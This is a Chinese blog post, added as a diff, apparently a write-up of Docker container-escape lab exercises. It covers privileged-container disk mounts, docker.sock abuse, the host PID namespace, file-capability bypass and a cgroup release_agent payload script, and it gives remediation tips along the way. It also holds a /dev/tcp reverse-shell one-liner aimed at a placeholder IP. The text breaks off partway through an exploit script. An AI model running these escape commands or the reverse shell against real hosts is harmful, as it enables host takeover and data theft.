@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="docker,逃逸," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="判断是否在docker容器中靶场环境：https:&#x2F;&#x2F;hexc2.com&#x2F; 方法一：检查 &#x2F;.dockerenv 文件Docker 默认会在容器根目录创建该文件。运行 ls -la &#x2F;.dockerenv 或 test -e &#x2F;.dockerenv &amp;&amp; echo “In Docker”，若存在通常说明在 Docker 中（部分定制镜像可能删除此文件）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="docker逃逸靶场练习">
+<meta property="og:url" content="https://h4ckforjob.github.io/2026/11/19/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="h4ckforjob&#39;sblog">
+<meta property="og:description" content="判断是否在docker容器中靶场环境：https:&#x2F;&#x2F;hexc2.com&#x2F; 方法一：检查 &#x2F;.dockerenv 文件Docker 默认会在容器根目录创建该文件。运行 ls -la &#x2F;.dockerenv 或 test -e &#x2F;.dockerenv &amp;&amp; echo “In Docker”，若存在通常说明在 Docker 中（部分定制镜像可能删除此文件）">
+<meta property="og:locale">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119110926438.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119111443145.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119112945519.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119115137254.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119120732063.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119120859427.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121129098.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121603749.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121700908.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121921666.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119122557954.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119123014230.png">
+<meta property="article:published_time" content="2026-11-19T02:56:39.000Z">
+<meta property="article:modified_time" content="2026-11-19T05:09:03.036Z">
+<meta property="article:author" content="h4ckforjob">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h4ckforjob.github.io/images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119110926438.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://h4ckforjob.github.io/2026/11/19/docker逃逸靶场练习/"/>
+
+
+
+
+
+  <title>docker逃逸靶场练习 | h4ckforjob'sblog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h4ckforjob'sblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://h4ckforjob.github.io/2026/11/19/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h4ckforjob'sblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">docker逃逸靶场练习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2026-11-19T10:56:39+08:00">
+                2026-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/docker%E9%80%83%E9%80%B8/" itemprop="url" rel="index">
+                    <span itemprop="name">docker逃逸</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            浏览: <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span> 次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.3k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="判断是否在docker容器中"><a href="#判断是否在docker容器中" class="headerlink" title="判断是否在docker容器中"></a>判断是否在docker容器中</h1><p>靶场环境：<a target="_blank" rel="noopener" href="https://hexc2.com/">https://hexc2.com/</a></p>
+<h2 id="方法一：检查-dockerenv-文件"><a href="#方法一：检查-dockerenv-文件" class="headerlink" title="方法一：检查 &#x2F;.dockerenv 文件"></a>方法一：检查 &#x2F;.dockerenv 文件</h2><p>Docker 默认会在容器根目录创建该文件。运行 ls -la &#x2F;.dockerenv 或 test -e &#x2F;.dockerenv &amp;&amp; echo “In Docker”，若存在通常说明在 Docker 中（部分定制镜像可能删除此文件）。</p>
+<h2 id="方法二：查看-proc-1-cgroup"><a href="#方法二：查看-proc-1-cgroup" class="headerlink" title="方法二：查看 &#x2F;proc&#x2F;1&#x2F;cgroup"></a>方法二：查看 &#x2F;proc&#x2F;1&#x2F;cgroup</h2><p>运行 cat &#x2F;proc&#x2F;1&#x2F;cgroup（或 grep -i docker &#x2F;proc&#x2F;1&#x2F;cgroup），如果输出包含 docker、containerd 或 kubepods，通常表示在容器或 Kubernetes 环境中。注意：在较新的 cgroup v2 系统中，该文件内容可能为空或结构不同，需结合其他方法。</p>
+<h2 id="方法三：观察进程列表与-PID-1"><a href="#方法三：观察进程列表与-PID-1" class="headerlink" title="方法三：观察进程列表与 PID 1"></a>方法三：观察进程列表与 PID 1</h2><p>运行 ps -ef 或 ps aux。容器内的进程数量通常很少，且 PID 1 往往是应用启动命令或精简 init 进程（如 sh、python、node），而不是宿主机常见的 systemd。</p>
+<h2 id="方法四：查看环境变量与挂载信息"><a href="#方法四：查看环境变量与挂载信息" class="headerlink" title="方法四：查看环境变量与挂载信息"></a>方法四：查看环境变量与挂载信息</h2><p>运行 env 检查是否存在容器注入的环境变量；运行 df -h 或 mount 查看根文件系统是否映射自 overlay&#x2F;容器存储驱动。</p>
+<h1 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h1><p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119110926438.png" alt="image-20261119110926438"></p>
+<h2 id="类型一：特权容器"><a href="#类型一：特权容器" class="headerlink" title="类型一：特权容器"></a>类型一：特权容器</h2><p>容器以 –privileged 启动。挂载宿主的虚拟磁盘，读取里面的 flag。<br>场景<br>你通过某个入口拿到了一个容器内的 root shell。</p>
+<p>先看看这个容器有什么特别的地方：设备、能力、挂载点。</p>
+<p>目标<br>逃逸到这台「宿主机」，读取 &#x2F;root&#x2F;flag。</p>
+<p>提示<br>ls &#x2F;dev&#x2F; 看看有什么不该出现在容器里的东西。<br>信息收集，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /dev | grep -E &quot;^vd&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119111443145.png" alt="image-20261119111443145"></p>
+<p>正常容器的 <code>/dev</code> 里只有 <code>null</code>、<code>zero</code>、<code>random</code> 这类设备。<code>vda</code> 是虚拟磁盘，它出现在容器里，说明宿主块设备已经被暴露进来。看到它就可以直接挂载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/host &amp;&amp; mount /dev/vda /mnt/host &amp;&amp; echo MOUNT_OK</span><br><span class="line">ls /mnt/host/root/</span><br><span class="line">cat /mnt/host/root/flag</span><br></pre></td></tr></table></figure>
+
+<p>命令解释：</p>
+<ol>
+<li><code>mkdir -p /mnt/host</code></li>
+</ol>
+<ul>
+<li><code>mkdir</code>：创建目录</li>
+<li><code>-p</code>：递归创建父目录；目录已存在也<strong>不会报错</strong></li>
+<li>作用：准备挂载点 <code>/mnt/host</code></li>
+</ul>
+<ol start="2">
+<li><code>mount /dev/vda /mnt/host</code></li>
+</ol>
+<ul>
+<li><code>mount</code>：挂载块设备</li>
+<li><code>/dev/vda</code>：虚拟化环境（KVM）里的第一块虚拟磁盘（virtio 盘）</li>
+<li><code>/mnt/host</code>：挂载点，挂载后磁盘内容就出现在这个目录下</li>
+</ul>
+<blockquote>
+<p>⚠️ 前提：&#x2F;dev&#x2F;vda 内有可识别文件系统（ext4&#x2F;xfs 等）；如果是裸盘没格式化会挂载失败</p>
+</blockquote>
+<ol start="3">
+<li><code>echo MOUNT_OK</code></li>
+</ol>
+<ul>
+<li>前面两步都成功后，打印字符串 <code>MOUNT_OK</code>，用来做脚本里的成功标记</li>
+</ul>
+<p>最终读取到flag如图：</p>
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119112945519.png" alt="image-20261119112945519"><br>mount 需要 CAP_SYS_ADMIN，而 –privileged 把全部 capability 都给了容器，同时关掉 seccomp 和 AppArmor。设备侧也一样：默认的 device cgroup 不允许容器看到宿主磁盘，–privileged 把这个限制一起放开。如果 &#x2F;dev 里没有 vda，不要马上放弃，设备名也可能是 sda、nvme0n1。先看 cat &#x2F;proc&#x2F;partitions 或 lsblk，只要能列出宿主磁盘，就说明设备隔离已经失效。修复时不要只盯着 –privileged，还要检查有没有 –device &#x2F;dev&#x2F;vda 这类写法。需要挂载能力就单独给 CAP_SYS_ADMIN，保留 seccomp 和 AppArmor，不要把宿主块设备交给容器。</p>
+<h2 id="类型二：Socket-泄露"><a href="#类型二：Socket-泄露" class="headerlink" title="类型二：Socket 泄露"></a>类型二：Socket 泄露</h2><p>容器挂载了宿主 docker.sock，用它起一个新容器挂宿主根即可读到 flag。</p>
+<p>场景<br>你在一个容器里。ls -la &#x2F;var&#x2F;run&#x2F; 会看到一个不该出现的东西。</p>
+<p>目标<br>通过它读到宿主机的 &#x2F;root&#x2F;flag。</p>
+<p>信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ # ^[[10;5Rwhich docker</span><br><span class="line">which docker</span><br><span class="line">/usr/local/bin/docker</span><br><span class="line">/ # ^[[13;5Rls -l /usr/local/bin/docker</span><br><span class="line">ls -l /usr/local/bin/docker</span><br><span class="line">-rwxr-xr-x    1 root     root      34764952 Nov 15 11:57 /usr/local/bin/docker</span><br><span class="line">/ # ^[[16;5Rls -la /var/run/docker.sock</span><br><span class="line">ls -la /var/run/docker.sock</span><br><span class="line">srw-rw----    1 root     103              0 Nov 19 03:35 /var/run/docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>权限位开头的 <code>s</code> 表示 socket 文件。接着用它列容器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/docker -H unix:///var/run/docker.sock ps --format &quot;&#123;&#123;.Names&#125;&#125; &#123;&#123;.Image&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>挂载宿主机根目录，并cat flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/root/flag</span><br></pre></td></tr></table></figure>
+<p>这条命令里，-v &#x2F;:&#x2F;host 冒号左边的 &#x2F; 是宿主路径，由宿主 Docker 解析。新容器只是执行 cat，真正越界的是 Docker daemon。Docker API 本身没有细粒度权限，能连上 socket 基本等于能做宿主 root 能做的事。如果容器里没有 docker 客户端，实战中可以上传一个静态编译的 docker，或者用 curl –unix-socket &#x2F;var&#x2F;run&#x2F;docker.sock 直接调 API。判据仍然是 ps 能不能看到宿主容器。修复：业务容器不要挂 &#x2F;var&#x2F;run&#x2F;docker.sock。需要管理接口就用 docker-socket-proxy，只开放只读接口；需要构建镜像就用 Kaniko 或 BuildKit，不要为了图方便把 socket 塞进容器。<br><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119115137254.png" alt="image-20261119115137254"></p>
+<p>挂载宿主机根，chroot 拿到宿主机 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v /:/host alpine chroot /host</span><br></pre></td></tr></table></figure>
+<p>直接挂载宿主机 &#x2F;bin&#x2F;bash 等，反向 shell（红队外带）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -v /:/host alpine /host/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="类型三：宿主-PID-命名空间"><a href="#类型三：宿主-PID-命名空间" class="headerlink" title="类型三：宿主 PID 命名空间"></a>类型三：宿主 PID 命名空间</h2><p>容器共享宿主 PID 命名空间，能直接看到并进入宿主进程的根文件系统。</p>
+<p>场景<br>ps aux 的输出里，PID 1 不是容器自己的 init。</p>
+<p>目标<br>读到宿主的 &#x2F;root&#x2F;flag。<br>信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | head -4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119120732063.png" alt="image-20261119120732063"></p>
+<p>容器自己的 PID 1 应该是 &#x2F;bin&#x2F;sh 或业务入口进程。这里出现 &#x2F;sbin&#x2F;init 和 [kthreadd] 这类内核线程，说明容器和宿主共用了 PID namespace。</p>
+<p>继续看 <code>/proc/1/root</code>：</p>
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119120859427.png" alt="image-20261119120859427"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/1/root/root/</span><br><span class="line">cat /proc/1/root/root/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121129098.png" alt="image-20261119121129098"></p>
+<p><code>/proc/&lt;pid&gt;/root</code> 指向该进程看到的根目录。PID 1 是宿主 init，它的根就是宿主根，所以这个符号链接直接绕过了容器自己的文件系统视图。</p>
+<p>路径不要写错：<code>/proc/1/root/root/flag</code> 里，第一个 <code>root</code> 是 proc 链接，第二个才是宿主的 <code>/root</code> 目录。如果 <code>ps</code> 看不到宿主进程，先确认不是 <code>--pid=container:&lt;name&gt;</code>；共享单个容器的 PID namespace 危害小一些，但同样会泄露该容器的进程。</p>
+<p>修复：不要使用 <code>--pid=host</code>。需要看宿主进程指标，用 cAdvisor、node_exporter 这类组件，不要把宿主进程表直接暴露给业务容器。</p>
+<h2 id="类型四：能力位放大"><a href="#类型四：能力位放大" class="headerlink" title="类型四：能力位放大"></a>类型四：能力位放大</h2><p>容器挂了宿主的敏感目录，还带着 CAP_DAC_READ_SEARCH —— 路径权限形同虚设。<br>场景<br><code>ls -ld /hostroot</code> 是 700，但你是 root。</p>
+<p>目标<br>读到 <code>/hostroot/flag</code>。</p>
+<p>信息收集，先看目录权限和 capability：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -ld /hostroot</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121603749.png" alt="image-20261119121603749"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep Cap /proc/self/status</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121700908.png" alt="image-20261119121700908"></p>
+<p><code>/hostroot</code> 是 700，里面的 <code>flag</code> 是 600。按普通 DAC 规则，这个目录进不去、文件也读不了。但 <code>CapEff</code> 是 <code>a80425fb</code>，把它拆开看，bit 1 是 <code>CAP_DAC_OVERRIDE</code>，bit 2 是 <code>CAP_DAC_READ_SEARCH</code>；这个值包含前者，不包含后者。也就是说，容器里的 root 仍然保留了 <code>DAC_OVERRIDE</code>，读 700 目录不会被拦。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /hostroot/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119121921666.png" alt="image-20261119121921666"></p>
+<p>这一类配置通常被归到 <code>CAP_DAC_READ_SEARCH</code> 名下。严格说，<code>DAC_READ_SEARCH</code> 只绕过读和目录遍历，<code>DAC_OVERRIDE</code> 读写都能绕；两者都能让 700 目录失效，区别在于能不能改文件。复现时以 <code>CapEff</code> 为准，不要只背名字，可以用 <code>capsh --decode=00000000a80425fb</code> 展开确认。</p>
+<p>修复：不要挂宿主 <code>/root</code>、<code>/etc</code>、<code>/var/lib/docker</code> 这类目录；必须挂就加 <code>:ro</code>，并尽量只挂单个文件。不要给 <code>CAP_DAC_READ_SEARCH</code>，也不要用 <code>CAP_DAC_OVERRIDE</code> 代替。</p>
+<h2 id="类型五：cgroup-release-agent"><a href="#类型五：cgroup-release-agent" class="headerlink" title="类型五：cgroup release_agent"></a>类型五：cgroup release_agent</h2><p>容器带着 SYS_ADMIN，cgroup v1 的 release_agent 能在宿主机上以 root 执行任意命令。</p>
+<p>场景<br>容器有 SYS_ADMIN，宿主用的是 cgroup v1。</p>
+<p>目标<br>让宿主机替你执行命令，读到 &#x2F;root&#x2F;flag。</p>
+<p>先确认 cgroup 版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /sys/fs/cgroup/ | head -6</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119122557954.png" alt="image-20261119122557954"></p>
+<p>看到一堆子系统目录，说明是 cgroup v1。如果是 v2，这里只有 <code>cgroup.controllers</code> 之类的文件，这条路走不通。</p>
+<p>挂载 <code>freezer</code> 子系统：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /tmp/c &amp;&amp; mount -t cgroup -o freezer cgroup /tmp/c</span><br></pre></td></tr></table></figure>
+
+<p><code>release_agent</code> 里要写宿主路径，不能写容器内的 <code>/payload.sh</code>。先从 <code>/etc/mtab</code> 的 <code>perdir</code> 算容器根在宿主上的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hp=$(sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab | head -1)</span><br><span class="line">echo &quot;host_path=$hp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/docker%E9%80%83%E9%80%B8%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20261119123014230.png" alt="image-20261119123014230"></p>
+<p>写 payload、注册钩子、触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;#!/bin/sh\ncat /root/flag &gt; %s/output\n&#x27; &quot;$hp&quot; &gt; /payload.sh</span><br><span class="line">chmod +x /payload.sh</span><br><span class="line">echo &quot;$hp/payload.sh&quot; &gt; /tmp/c/release_agent</span><br><span class="line">mkdir -p /tmp/c/x &amp;&amp; echo 1 &gt; /tmp/c/x/notify_on_release</span><br><span class="line">sh -c &quot;echo $$ &gt; /tmp/c/x/cgroup.procs&quot;</span><br><span class="line">sleep 2 &amp;&amp; cat /output</span><br></pre></td></tr></table></figure>
+
+<p>利用脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># HexC2 · escape-release-agent</span><br><span class="line"># https://hexc2.com/</span><br><span class="line"># 用法: nc &lt;IP&gt; &lt;PORT&gt; &lt; 